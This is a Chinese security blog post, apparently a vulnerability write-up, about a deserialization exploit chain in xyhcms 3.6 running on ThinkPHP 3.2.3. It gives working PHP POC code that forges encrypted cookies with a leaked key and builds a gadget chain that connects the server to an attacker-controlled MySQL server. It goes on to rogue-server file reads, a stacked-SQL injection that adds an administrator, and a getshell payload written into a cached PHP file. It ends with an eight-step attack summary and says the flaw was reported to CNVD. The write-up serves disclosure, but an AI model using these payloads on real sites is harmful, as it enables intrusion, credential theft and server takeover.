> 原文链接: https://www.anquanke.com//post/id/232823 


# 痛失CVE之xyhcms（Thinkphp3.2.3）反序列化


                                阅读量   
                                **119725**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p3.ssl.qhimg.com/t01b5a3e8115b979600.png)](https://p3.ssl.qhimg.com/t01b5a3e8115b979600.png)



2020年5月份的时候看到先知有一篇文章

[https://xz.aliyun.com/t/7756](https://xz.aliyun.com/t/7756)

这个漏洞非常非常简单，经典插配置文件getshell，而且使用了&lt;?=phpinfo();?&gt;这种标签风格以应对代码对&lt;?php的过滤。xyhcms后续的修复方案当然是把&lt;?也拉黑，但这种修复方案是非常消极的，我们可以看一眼配置文件。

[http://demo.xyhcms.com/App/Runtime/Data/config/site.php](http://demo.xyhcms.com/App/Runtime/Data/config/site.php)

[![](https://p0.ssl.qhimg.com/t0175b3abe61849fb8e.png)](https://p0.ssl.qhimg.com/t0175b3abe61849fb8e.png)

可以发现这些配置选项都是以序列化形式存储在配置文件当中的，且为php后缀。

以安全的角度来想，既然这些配置信息不是写在php代码中以变量存储(大多数cms比如discuz的做法)，就不应该以php后缀存储。否则极易产生插配置文件getshell的漏洞。

即使认真过滤了php标签，也可能产生xss和信息泄露的问题。

如果是以序列化形式存储，那么配置文件不管什么后缀，都不应该被轻易访问到，要么像thinkphp5一样配置文件根本不在web目录中，要么每次建站随机配置文件名称。

最后，这个序列化形式存储在文件中也有待商榷，容易产生反序列化问题。

当然，也可以学大多数cms的另外一个做法，配置信息存在数据库中。

下载源码，搭一搭开始审计xyhcms_v3.6_20201128

[http://www.xyhcms.com/xyhcms](http://www.xyhcms.com/xyhcms)

由于注意到配置文件是以反序列化方式存储，所以我优先搜了搜unserialize(

[![](https://p3.ssl.qhimg.com/t0149e0f380c8c88a2e.png)](https://p3.ssl.qhimg.com/t0149e0f380c8c88a2e.png)

此cms使用的thinkphp3.2.3框架，所以下面的不用看了，只看

/App/Common/Common/function.php

发现get_cookie是使用的反序列化

```
//function get_cookie($name, $key = '@^%$y5fbl') `{`
function get_cookie($name, $key = '') `{`

if (!isset($_COOKIE[$name])) `{`
return null;
`}`
$key = empty($key) ? C('CFG_COOKIE_ENCODE') : $key;

$value = $_COOKIE[$name];
$key = md5($key);
$sc = new \Common\Lib\SysCrypt($key);
$value = $sc-&gt;php_decrypt($value);
return unserialize($value);
`}`
```

$key默认为空，有注释可以固定为【@^%$y5fbl】，为空则使用CFG_COOKIE_ENCODE当key，然后md5加密$key，传入 SysCrypt类当密钥，加密代码见/App/Common/Lib/SysCrypt.class.php。 $value是COOKIE中参数为$name对应的值，用SysCrypt类的php_decrypt方法解密，解密之后是一个序列化字符串，可以被反序列化。

但这个反序列化的前提是知道key，如果被取消注释了，那么key为【@^%$y5fbl】，如果默认没改，就是CFG_COOKIE_ENCODE。而CFG_COOKIE_ENCODE这个值创建网站时会被随机分配一个，且可以在后台改。

[![](https://p3.ssl.qhimg.com/t01bffee084a9780184.png)](https://p3.ssl.qhimg.com/t01bffee084a9780184.png)

且在/App/Runtime/Data/config/site.php中被泄露。

[![](https://p2.ssl.qhimg.com/t011b3f9a95109276e4.png)](https://p2.ssl.qhimg.com/t011b3f9a95109276e4.png)

总结一下就是cookie传值，site.php泄露key，这个值先被php_decrypt解密，再进行反序列化，和shiro相似。

那么找到了反序列化入口，而且是极易利用的COOKIE里面。但管理员登录后COOKIE中并没有加密字符串，搜一下get_cookie(，发现是前台注册会员用的。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01749ecd8a4b7d90dd.png)

前台随便注册一个会员，在COOKIE中发现加密字符串，里面任意一个都可以作为序列化入口。

[![](https://p0.ssl.qhimg.com/t01e0d6b053ebe6c5b1.png)](https://p0.ssl.qhimg.com/t01e0d6b053ebe6c5b1.png)

比如nickname=XSIEblowDDRXIVJxBTcHPg5hAWsDbVVoACdcPg%3D%3D就是前台账户sonomon的序列化并加密。这里用接口试一下就明白了。

PS：后面发现使用uid更加通用。

/xyhcms/index.php?s=/Public/loginChk.html

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t0169c1aa541c1c60fd.png)

[![](https://p5.ssl.qhimg.com/t0110a2cea1b662dc45.png)](https://p5.ssl.qhimg.com/t0110a2cea1b662dc45.png)

这里将get_cookie，set_cookie，SysCrypt相关的代码抄一下并修改好，写处php加解密工具。

```
&lt;?php

class SysCrypt `{`

private $crypt_key;
public function __construct($crypt_key) `{`
$this -&gt; crypt_key = $crypt_key;
`}`
public function php_encrypt($txt) `{`
srand((double)microtime() * 1000000);
$encrypt_key = md5(rand(0,32000));
$ctr = 0;
$tmp = '';
for($i = 0;$i&lt;strlen($txt);$i++) `{`
$ctr = $ctr == strlen($encrypt_key) ? 0 : $ctr;
$tmp .= $encrypt_key[$ctr].($txt[$i]^$encrypt_key[$ctr++]);
`}`
return base64_encode(self::__key($tmp,$this -&gt; crypt_key));
`}`

public function php_decrypt($txt) `{`
$txt = self::__key(base64_decode($txt),$this -&gt; crypt_key);
$tmp = '';
for($i = 0;$i &lt; strlen($txt); $i++) `{`
$md5 = $txt[$i];
$tmp .= $txt[++$i] ^ $md5;
`}`
return $tmp;
`}`

private function __key($txt,$encrypt_key) `{`
$encrypt_key = md5($encrypt_key);
$ctr = 0;
$tmp = '';
for($i = 0; $i &lt; strlen($txt); $i++) `{`
$ctr = $ctr == strlen($encrypt_key) ? 0 : $ctr;
$tmp .= $txt[$i] ^ $encrypt_key[$ctr++];
`}`
return $tmp;
`}`

public function __destruct() `{`
$this -&gt; crypt_key = null;
`}`
`}`

function get_cookie($name, $key = '') `{`
$key = 'YzYdQmSE2';
$key = md5($key);
$sc = new SysCrypt($key);
$value = $sc-&gt;php_decrypt($name);
return unserialize($value);
`}`

function set_cookie($args, $key = '') `{`
$key = 'YzYdQmSE2';
$value = serialize($args);
$key = md5($key);
$sc = new SysCrypt($key);
$value = $sc-&gt;php_encrypt($value);
return $value;
`}`

$a = set_cookie('luoke','');
echo $a.'&lt;br&gt;';
echo get_cookie($a,'');
```

得到加密序列化字符串

[![](https://p5.ssl.qhimg.com/t01b3c2e6735f2762fe.png)](https://p5.ssl.qhimg.com/t01b3c2e6735f2762fe.png)

放到cookie里试一下

[![](https://p0.ssl.qhimg.com/t01a3cf7505489c52a7.png)](https://p0.ssl.qhimg.com/t01a3cf7505489c52a7.png)

完美，接下来就是需要找到反序列化链，我们先随便找个__destruct(修改源码，加个var_dump(1)，看能否触发。

/Include/Library/Think/Image/Driver/Imagick.class.php

```
public function __destruct() `{`
var_dump(1);
empty($this-&gt;img) || $this-&gt;img-&gt;destroy();
`}`
写好POC

&lt;?php
namespace Think\Image\Driver;
class Imagick`{`
`}`

namespace Common\Lib;
class SysCrypt `{`

private $crypt_key;
public function __construct($crypt_key) `{`
$this -&gt; crypt_key = $crypt_key;
`}`
public function php_encrypt($txt) `{`
srand((double)microtime() * 1000000);
$encrypt_key = md5(rand(0,32000));
$ctr = 0;
$tmp = '';
for($i = 0;$i&lt;strlen($txt);$i++) `{`
$ctr = $ctr == strlen($encrypt_key) ? 0 : $ctr;
$tmp .= $encrypt_key[$ctr].($txt[$i]^$encrypt_key[$ctr++]);
`}`
return base64_encode(self::__key($tmp,$this -&gt; crypt_key));
`}`

public function php_decrypt($txt) `{`
$txt = self::__key(base64_decode($txt),$this -&gt; crypt_key);
$tmp = '';
for($i = 0;$i &lt; strlen($txt); $i++) `{`
$md5 = $txt[$i];
$tmp .= $txt[++$i] ^ $md5;
`}`
return $tmp;
`}`

private function __key($txt,$encrypt_key) `{`
$encrypt_key = md5($encrypt_key);
$ctr = 0;
$tmp = '';
for($i = 0; $i &lt; strlen($txt); $i++) `{`
$ctr = $ctr == strlen($encrypt_key) ? 0 : $ctr;
$tmp .= $txt[$i] ^ $encrypt_key[$ctr++];
`}`
return $tmp;
`}`

public function __destruct() `{`
$this -&gt; crypt_key = null;
`}`
`}`

function get_cookie($name, $key = '') `{`
$key = 'YzYdQmSE2';
$key = md5($key);
$sc = new \Common\Lib\SysCrypt($key);
$value = $sc-&gt;php_decrypt($name);
return unserialize($value);
`}`

function set_cookie($args, $key = '') `{`
$key = 'YzYdQmSE2';
$value = serialize($args);
$key = md5($key);
$sc = new \Common\Lib\SysCrypt($key);
$value = $sc-&gt;php_encrypt($value);
return $value;
`}`

$b = new \Think\Image\Driver\Imagick();
$a = set_cookie($b,'');
echo str_replace('+','%2B',$a);
```

[![](https://p5.ssl.qhimg.com/t017ba92bd6661bee21.png)](https://p5.ssl.qhimg.com/t017ba92bd6661bee21.png)

如上图，成功以反序列化方式触发__destruct()，后续测试发现也不需要登录。那么万事具备，只差反序列化链，但是众所周知thinkphp5.x都已被审计出反序列化链，thinkphp3.2.3却并不存在反序列化链，9月份时我问某个群里，也都说的没有。

我自己的找链思路如下，全局找__destruct()就只有一个靠谱的。

/Include/Library/Think/Image/Driver/Imagick.class.php

```
public function __destruct() `{`
empty($this-&gt;img) || $this-&gt;img-&gt;destroy();
`}`
```

$this-&gt;img可控，也就是说可以触发任意类的destroy方法，或者触发__call方法。__call没有任何靠谱的，反倒是destroy()两个都比较靠谱。

/Include/Library/Think/Session/Driver/Db.class.php

/Include/Library/Think/Session/Driver/Memcache.class.php

Db.class看起来可以SQL注入，而Memcache.class看起来可以执行任意类的delete方法。但两者的destroy方法都有个问题，必须要传入一个$sessID参数，而Imagick.class的destroy并不能传参。所以在这儿就断掉了。

当时我在php7环境中测试，这个东西卡死我了，后来有人找出了thinkphp3.2.3的反序列化链，我才明白原来换php5就行了。直骂自己菜，对php版本特性知道的太少了，否则我可能早就审计出thinkphp3.2.3的反序列化链了。

[https://mp.weixin.qq.com/s/S3Un1EM-cftFXr8hxG4qfA](https://mp.weixin.qq.com/s/S3Un1EM-cftFXr8hxG4qfA)

```
&lt;?php
function a($test)`{`
echo 'print '.$test;
phpinfo();
`}`
a();
```

这样的代码在php7中无法执行，在php5中虽然会报错，但依旧会执行。

[![](https://p4.ssl.qhimg.com/t01b71974c496aa1a19.png)](https://p4.ssl.qhimg.com/t01b71974c496aa1a19.png)

将环境切换到php5， Db.class由于没有mysql_connect()建立连接，所以无法执行SQL。

```
public function destroy($sessID) `{`
$hander = is_array($this-&gt;hander)?$this-&gt;hander[0]:$this-&gt;hander;
mysql_query("DELETE FROM ".$this-&gt;sessionTable." WHERE session_id = '$sessID'",$hander);
if(mysql_affected_rows($hander))
return true;
return false;
`}`
```

只能Memcache.class

```
public function destroy($sessID) `{`
return $this-&gt;handle-&gt;delete($this-&gt;sessionName.$sessID);
`}`
```

$this-&gt;handle和$this-&gt;sessionName均可控，此时等于可执行任意类的delete方法。

此时找delete方法，发现都跟数据库有关，且必须传输数组，由于$this-&gt;sessionName.$sessID必定是个字符串，所以得找一个能转数组的。

/Include/Library/Think/Model.class.php

```
public function delete($options = array()) `{`
$pk = $this-&gt;getPk();
if (empty($options) &amp;&amp; empty($this-&gt;options['where'])) `{`
if (!empty($this-&gt;data) &amp;&amp; isset($this-&gt;data[$pk])) `{`
return $this-&gt;delete($this-&gt;data[$pk]);
`}` else `{`
return false;
`}`
```

getPk()代码简短，直接返回$this-&gt;pk。

```
public function getPk() `{`
return $this-&gt;pk;
`}`
```

那么$pk，$this-&gt;options，$this-&gt;data均可控，此时又调用了delete()自己一次，所以等于可以带参数使用delete方法了。

后面一系列参数都不影响代码执行，最终来到

```
$result = $this-&gt;db-&gt;delete($options);
```

等于利用Model.class作为跳板，可以带参数执行任意类的delete方法。

/Include/Library/Think/Db/Driver.class.php

```
public function delete($options=array()) `{`
$this-&gt;model=$options['model'];
$this-&gt;parseBind(!empty($options['bind'])?$options['bind']:array());
$table=$this-&gt;parseTable($options['table']);
$sql='DELETE FROM '.$table;
if(strpos($table,','))`{`
if(!empty($options['using']))`{`
$sql .= ' USING '.$this-&gt;parseTable($options['using']).' ';
`}`
$sql .= $this-&gt;parseJoin(!empty($options['join'])?$options['join']:'');
`}`
$sql .= $this-&gt;parseWhere(!empty($options['where'])?$options['where']:'');
if(!strpos($table,','))`{`
$sql .= $this-&gt;parseOrder(!empty($options['order'])?$options['order']:'')
.$this-&gt;parseLimit(!empty($options['limit'])?$options['limit']:'');
`}`
$sql .=$this-&gt;parseComment(!empty($options['comment'])?$options['comment']:'');
return $this-&gt;execute($sql,!empty($options['fetch_sql']) ? true : false);
`}`
```

此处在拼接$options数组中的SQL语句，最终放在$this-&gt;execute方法中执行。

```
public function execute($str,$fetchSql=false) `{`
$this-&gt;initConnect(true);
if ( !$this-&gt;_linkID ) return false;
$this-&gt;queryStr = $str;
if(!empty($this-&gt;bind))`{`
$that=$this;
$this-&gt;queryStr =strtr($this-&gt;queryStr,array_map(function($val) use($that)`{` return '_cf4 .$that-&gt;escapeString($val).'_cf5 ; `}`,$this-&gt;bind));
`}`
if($fetchSql)`{`
return $this-&gt;queryStr;
`}`
```

跟进$this-&gt;initConnect()

```
protected function initConnect($master=true) `{`
if(!empty($this-&gt;config['deploy']))
$this-&gt;_linkID = $this-&gt;multiConnect($master);
else
if ( !$this-&gt;_linkID ) $this-&gt;_linkID = $this-&gt;connect();
`}`
```

跟进$this-&gt;connect()

```
public function connect($config='',$linkNum=0,$autoConnection=false) `{`
if ( !isset($this-&gt;linkID[$linkNum]) ) `{`
if(empty($config))$config =$this-&gt;config;
try`{`
if(empty($config['dsn'])) `{`
$config['dsn']=$this-&gt;parseDsn($config);
`}`
if(version_compare(PHP_VERSION,'5.3.6','&lt;='))`{`
$this-&gt;options[PDO::ATTR_EMULATE_PREPARES]=false;
`}`
$this-&gt;linkID[$linkNum] = new PDO( $config['dsn'], $config['username'], $config['password'],$this-&gt;options);
`}`catch ($e) `{`
if($autoConnection)`{`
trace($e-&gt;getMessage(),'','ERR');
return $this-&gt;connect($autoConnection,$linkNum);
`}`else`{`
E($e-&gt;getMessage());
`}`
`}`
`}`
return $this-&gt;linkID[$linkNum];
`}`
```

可以发现最终是以PDO建立数据库连接，$config 也就是$this-&gt;config可控，等于我们可以连接任意数据库，然后执行SQL语句。

可以参考[https://mp.weixin.qq.com/s/S3Un1EM-cftFXr8hxG4qfA](https://mp.weixin.qq.com/s/S3Un1EM-cftFXr8hxG4qfA)写出POC。

```
&lt;?php
namespace Think\Db\Driver;
use PDO;
class Mysql`{`
protected $options = array(
PDO::MYSQL_ATTR_LOCAL_INFILE =&gt; true
);
protected $config = array(
"dsn"=&gt; "mysql:host=localhost;dbname=xyhcms;port=3306",
"username" =&gt; "root",
"password" =&gt; "root"
);
`}`

namespace Think;
class Model`{`
protected $options= array();
protected $pk;
protected $data = array();
protected $db = null;
public function __construct()`{`
$this-&gt;db = new \Think\Db\Driver\Mysql();
$this-&gt;options['where'] = '';
$this-&gt;pk = 'luoke';
$this-&gt;data[$this-&gt;pk] = array(
"table" =&gt; "xyh_admin_log",
"where" =&gt; "id=0"
);
`}`
`}`

namespace Think\Session\Driver;
class Memcache`{`
protected $handle;
public function __construct() `{`
$this-&gt;handle = new \Think\Model();
`}`
`}`

namespace Think\Image\Driver;
class Imagick`{`
private $img;
public function __construct() `{`
$this-&gt;img = new \Think\Session\Driver\Memcache();
`}`
`}`

namespace Common\Lib;
class SysCrypt`{`

private $crypt_key;
public function __construct($crypt_key) `{`
$this -&gt; crypt_key = $crypt_key;
`}`
public function php_encrypt($txt) `{`
srand((double)microtime() * 1000000);
$encrypt_key = md5(rand(0,32000));
$ctr = 0;
$tmp = '';
for($i = 0;$i&lt;strlen($txt);$i++) `{`
$ctr = $ctr == strlen($encrypt_key) ? 0 : $ctr;
$tmp .= $encrypt_key[$ctr].($txt[$i]^$encrypt_key[$ctr++]);
`}`
return base64_encode(self::__key($tmp,$this -&gt; crypt_key));
`}`

public function php_decrypt($txt) `{`
$txt = self::__key(base64_decode($txt),$this -&gt; crypt_key);
$tmp = '';
for($i = 0;$i &lt; strlen($txt); $i++) `{`
$md5 = $txt[$i];
$tmp .= $txt[++$i] ^ $md5;
`}`
return $tmp;
`}`

private function __key($txt,$encrypt_key) `{`
$encrypt_key = md5($encrypt_key);
$ctr = 0;
$tmp = '';
for($i = 0; $i &lt; strlen($txt); $i++) `{`
$ctr = $ctr == strlen($encrypt_key) ? 0 : $ctr;
$tmp .= $txt[$i] ^ $encrypt_key[$ctr++];
`}`
return $tmp;
`}`

public function __destruct() `{`
$this -&gt; crypt_key = null;
`}`
`}`

function get_cookie($name, $key = '') `{`
$key = '7q6Gw97sh';
$key = md5($key);
$sc = new \Common\Lib\SysCrypt($key);
$value = $sc-&gt;php_decrypt($name);
return unserialize($value);
`}`

function set_cookie($args, $key = '') `{`
$key = '7q6Gw97sh';
$value = serialize($args);
$key = md5($key);
$sc = new \Common\Lib\SysCrypt($key);
$value = $sc-&gt;php_encrypt($value);
return $value;
`}`

$b = new \Think\Image\Driver\Imagick();
$a = set_cookie($b,'');
echo str_replace('+','%2B',$a);
```

[![](https://p2.ssl.qhimg.com/t015ffd38c54fa383f3.png)](https://p2.ssl.qhimg.com/t015ffd38c54fa383f3.png)

成功执行SQL语句，但很显然，这几乎是无危害的，因为你得知道别人数据库账户密码，或者填自己服务器的账户密码。文章中提到了利用恶意mysql服务器读取文件。

[https://github.com/Gifts/Rogue-MySql-Server](https://github.com/Gifts/Rogue-MySql-Server)

文件读取需要绝对路径，可以猜测，也可以访问如下文件，php报错可能会爆出。

/App/Api/Conf/config.php

/App/Api/Controller/ApiCommonController.class.php

/App/Common/LibTag/Other.class.php

/App/Common/Model/ArcViewModel.class.php

得到绝对路径后，修改python脚本增加filelist为D:\\xampp\\htdocs\\xyhcms\\App\\Common\\Conf\\db.php，修改POC数据库连接地址，成功读取配置文件。

[![](https://p4.ssl.qhimg.com/t01a82c1583b07ba47b.png)](https://p4.ssl.qhimg.com/t01a82c1583b07ba47b.png)

读取到了本地的数据库之后，POC更换数据库地址，PDO默认支持堆叠，所以可以直接操作数据库。这里简单一点可以新增一个管理员上去。

/xyhai.php?s=/Login/index

test/123456登录

如果需要注数据，可以尝试把数据插在一些无关紧要的地方，比如留言板。

/index.php?s=/Guestbook/index.html

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t010e973ffecf1ba8fd.png)

同理，权限足够也可以直接利用outfile或者general_log来getshell。

如果权限不够怎么办呢？使用序列化数据存储为php文件实在非常危险，翻翻缓存文件夹。发现数据库列的信息也以序列化形式存储在php文件当中。

/App/Runtime/Data/_fields/xyhcms.xyh_guestbook.php

[![](https://p4.ssl.qhimg.com/t0155ba5d6bc633e735.png)](https://p4.ssl.qhimg.com/t0155ba5d6bc633e735.png)

此时我们需要清理一下缓存

[![](https://p5.ssl.qhimg.com/t01d48d07a18745e084.png)](https://p5.ssl.qhimg.com/t01d48d07a18745e084.png)

然后反序列化操纵mysql新增一个无关紧要的列名为&lt;script language=’php’&gt;phpinfo();&lt;/script&gt;

PS：这里不能用问号，暂时不清楚原因。

“where” =&gt; “id=0;alter table xyh_guestbook add column `&lt;script language=’php’&gt;phpinfo();&lt;/script&gt;` varchar(10);”

最后再访问一下前台的留言板，或者后台的留言本管理，生成缓存文件。

/index.php?s=/Guestbook/index.html

最终getshell

/App/Runtime/Data/_fields/xyhcms.xyh_guestbook.php

[![](https://p2.ssl.qhimg.com/t011a2fcdae74e261bd.png)](https://p2.ssl.qhimg.com/t011a2fcdae74e261bd.png)

总结一下

1，要求php5.x版本

2，/App/Runtime/Data/config/site.php泄露CFG_COOKIE_ENCODE

3，制作POC，获得反序列化payload

4，最好开放会员注册，检查/index.php?s=/Home/Public/login.html

然后向/index.php?s=/Public/loginChk.html，/index.php?s=/Home/Member/index.html等需要cookie的接口传递paylaod。Cookie键值为uid，nickname等。

5，访问一些php文件，通过报错获取绝对路径。

6，通过恶意mysql服务器，读取配置文件，获取数据库信息。

7，操作数据库。

8，getshell

这是一个非常冗长而有意思的漏洞利用链。

已上交CNVD-2021-05552
